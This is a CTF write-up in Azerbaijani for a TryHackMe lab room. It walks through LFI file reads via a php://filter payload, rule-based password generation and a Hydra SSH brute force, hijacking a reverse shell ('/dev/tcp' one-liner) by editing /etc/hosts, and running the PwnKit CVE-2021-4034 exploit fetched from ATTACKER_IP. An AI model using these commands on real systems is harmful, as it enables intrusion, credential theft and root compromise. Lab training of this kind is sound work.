# TryHackMe — Red Writeup (Azərbaycan dilində)

**Otaq linki:** https://tryhackme.com/room/redisl33t  
**Çətinlik:** Orta  
**Mövzu:** LFI, Password Cracking, /etc/hosts Manipulation, PwnKit (CVE-2021-4034)

---

## Ümumi Baxış

Bu lab-da **Red Team vs Blue Team** döyüşü var. Biz **Blue** tərəfindəyik və Red-in hack etdiyi sistemi geri almalıyıq. Red bir neçə müdafiə mexanizmi qurub:

1. Sizi sistemdən atacaq
2. Şifrəni dəyişəcək amma oxşar saxlayacaq
3. Sizi çaşdırmağa çalışacaq

---

## Flaglər

| Flag | Dəyər |
|------|-------|
| Flag 1 | `/home/blue/flag1` |
| Flag 2 | `/home/red/flag2` |
| Flag 3 | `/root/flag3` |

---

## Addım 1: Port Scan (Nmap)

```bash
nmap -Pn -sV 10.114.178.134
```

**Nəticə:**

| Port | Servis |
|------|--------|
| 22/tcp | SSH |
| 80/tcp | HTTP — Atlanta Bootstrap template |

---

## Addım 2: LFI Zəifliyi

Saytın URL-i:
```
http://10.114.178.134/index.php?page=home.html
```

`page=` parametri **Local File Inclusion (LFI)** zəifliyinə malikdir!

**PHP filter ilə sistem fayllarını oxu:**
```
http://10.114.178.134/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

Base64 decode et:
```bash
echo "base64_metn" | base64 -d
```

**Nəticə — iki əsas user:**
```
blue:x:1000:1000:blue:/home/blue:/bin/bash
red:x:1001:1001::/home/red:/bin/bash
```

---

## Addım 3: Şifrəni Tap

**blue-nun bash history-ni oxu:**
```
http://10.114.178.134/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history
```

**Decode nəticəsi:**
```bash
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

**blue-nun reminder faylını oxu:**
```
http://10.114.178.134/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder
```

**Nəticə:** `sup3r_p@s$w0rd!`

---

## Addım 4: Şifrə Variasiyaları Yarat

Red şifrəni dəyişir amma oxşar saxlayır. Hashcat ilə bütün variasiyaları yarat:

```bash
echo 'sup3r_p@s$w0rd!' > reminder.txt
hashcat --stdout reminder.txt -r /usr/local/hashcat/rules/best64.rule > passlist.txt
```

**Hydra ilə SSH brute force:**
```bash
hydra -l blue -P passlist.txt ssh://10.114.178.134 -t 4
```

**Nəticə:**
```
[22][ssh] host: 10.114.178.134 login: blue password: sup3r_p@s$w0rd!23
```

---

## Addım 5: SSH ilə Giriş — Birinci Flag

```bash
ssh blue@10.114.178.134
```

**Qeyd:** Red şifrəni tez-tez dəyişir — əgər işləməsə Hydra-nı yenidən işlət!

```bash
cat /home/blue/flag1
```

**Birinci flag tapıldı!**

---

## Addım 6: pspy64 ilə Prosesləri İzlə

Red sizi sistemdən atacaq — tez hərəkət edin!

**AttackBox-da pspy64 yüklə:**
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
python3 -m http.server 8000
```

**Blue shell-də:**
```bash
cd /tmp
wget http://ATTACKER_IP:8000/pspy64
chmod +x pspy64
./pspy64
```

**Şübhəli proses tapıldı:**
```
UID=1001 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

Red hər dəqiqə `redrules.thm:9001`-ə reverse shell göndərir!

---

## Addım 7: /etc/hosts Manipulyasiyası — İkinci Flag

`/etc/hosts` faylı **yazıla biləndir!**

```bash
cat /etc/hosts
# 192.168.0.1 redrules.thm  ← köhnə IP
```

**Öz IP-ni əlavə et:**
```bash
echo 'ATTACKER_IP redrules.thm' >> /etc/hosts
```

**AttackBox-da dinlə:**
```bash
nc -lvnp 9001
```

Bir dəqiqə gözlə — Red avtomatik shell göndərəcək!

**Shell gəldikdə:**
```bash
cat /home/red/flag2
```

**İkinci flag tapıldı!**

---

## Addım 8: Privilege Escalation — Üçüncü Flag

Red-in home qovluğunda `.git` qovluğu var:

```bash
ls -la /home/red/.git/
# pkexec  ← SUID bit set!
```

```bash
./pkexec --version
# pkexec version 0.105  ← CVE-2021-4034 zəifliyi!
```

**PwnKit exploit yüklə:**

**AttackBox-da:**
```bash
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
chmod +x PwnKit
python3 -m http.server 8000
```

**Red shell-də:**
```bash
cd /home/red/.git/
wget http://ATTACKER_IP:8000/PwnKit
chmod +x PwnKit
./PwnKit
```

**Root oldun:**
```bash
whoami
# root
cat /root/flag3
```

**Üçüncü flag tapıldı!**

---

## Hücumun Tam Xəritəsi

```
Nmap → Port 22, 80 tapıldı
        ↓
LFI → /etc/passwd, .bash_history, .reminder oxundu
        ↓
Hashcat → Şifrə variasiyaları yaradıldı
        ↓
Hydra → blue-nun şifrəsi tapıldı
        ↓
SSH → Blue shell, Flag 1 tapıldı
        ↓
pspy64 → Red-in cron job-u tapıldı
        ↓
/etc/hosts manipulyasiyası → Red shell aldıq
        ↓
Flag 2 tapıldı
        ↓
PwnKit (CVE-2021-4034) → Root oldun
        ↓
Flag 3 tapıldı! 🎉
```

---

## Öyrəndiklərimiz

| Zəiflik | Təsvir | Həll yolu |
|---------|--------|-----------|
| LFI | `page=` parametri sanitize edilmirdi | Input yoxlanmalıdır |
| Zəif şifrə | Şifrə sadə pattern üzrə dəyişirdi | Güclü şifrə siyasəti |
| /etc/hosts yazıla bilir | Digər userlər dəyişdirə bilirdi | İcazələr düzgün qurulmalıdır |
| PwnKit CVE-2021-4034 | pkexec köhnə versiya idi | Sistem yenilənməlidir |

---

## İstifadə Olunan Alətlər

| Alət | İstifadəsi |
|------|-----------|
| `nmap` | Port scan |
| LFI | Sistem fayllarını oxumaq |
| `hashcat` | Şifrə variasiyaları yaratmaq |
| `hydra` | SSH brute force |
| `pspy64` | Prosesləri izləmək |
| `nc` | Reverse shell dinləmək |
| PwnKit | Privilege escalation |

---

*Writeup Azərbaycan dilində hazırlanmışdır.*
